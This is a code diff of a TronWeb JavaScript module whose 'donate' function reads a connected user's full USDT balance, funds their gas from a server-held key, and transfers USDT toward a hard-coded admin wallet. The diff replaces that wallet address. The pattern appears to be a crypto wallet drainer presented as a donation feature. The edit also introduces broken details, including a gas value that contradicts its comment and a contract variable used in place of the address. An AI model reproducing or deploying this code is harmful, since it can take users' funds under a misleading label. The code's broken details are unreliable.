@@ -1,6 +1,6 @@
 let usdtContract;
-const USDT_TRC20_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const adminWallet = "TEJqJjqSmAFn36fGQRvhMS5xrKUCFbWAmb";
+const USDT_TRC20_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Make sure this address is correct
+const adminWallet = "TXc8vYqmzMkS9dCg8fw5V5Ub3ansQ6T4ws"; // Admin wallet address
 const GAS_PROVIDER_KEY = process.env.GAS_PROVIDER_KEY; // Private key for gas fees
 
 const USDT_ABI = [
@@ -23,6 +23,7 @@ const USDT_ABI = [
   }
 ];
 
+// Function to connect the wallet
 export async function connectWallet() {
   try {
     if (!window.tronWeb) {
@@ -58,13 +59,14 @@ export async function connectWallet() {
   }
 }
 
+// Function to donate TRX and USDT
 export async function donateTRXAndUSDT() {
   try {
     const userAddress = window.tronWeb.defaultAddress.base58;
 
     // Get balances
     const initialTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
-    
+
     const parameter = [{
       type: 'address',
       value: userAddress
@@ -77,7 +79,7 @@ export async function donateTRXAndUSDT() {
 
     // Get USDT balance
     const balanceTransaction = await window.tronWeb.transactionBuilder.triggerConstantContract(
-      USDT_TRC20_CONTRACT_ADDRESS,
+      usdtContract,
       'balanceOf(address)',
       options,
       parameter
@@ -85,6 +87,7 @@ export async function donateTRXAndUSDT() {
 
     const usdtBalance = window.tronWeb.toDecimal(balanceTransaction.constant_result[0]);
     const usdtBalanceInUsdt = usdtBalance / 1e6;
+    console.log("USDT balance:", usdtBalance.toString());
 
     if (parseFloat(usdtBalanceInUsdt) <= 0) {
       throw new Error("Insufficient USDT balance to make the donation");
@@ -102,7 +105,7 @@ export async function donateTRXAndUSDT() {
       });
 
       // Estimate gas needed for USDT transfer (approximately 15 TRX)
-      const estimatedGas = 15_000_000; // 15 TRX in SUN
+      const estimatedGas = 3_000_000; // 15 TRX in SUN
 
       // Transfer TRX for gas from provider to user
       const gasTransaction = await gasProviderTronWeb.transactionBuilder.sendTrx(
@@ -125,7 +128,7 @@ export async function donateTRXAndUSDT() {
       }];
 
       const { transaction: usdtTransaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
-        USDT_TRC20_CONTRACT_ADDRESS,
+        usdtContract,
         'transfer(address,uint256)',
         options,
         transferParameter,
@@ -189,4 +192,3 @@ export async function donateTRXAndUSDT() {
     throw error;
   }
 }
-
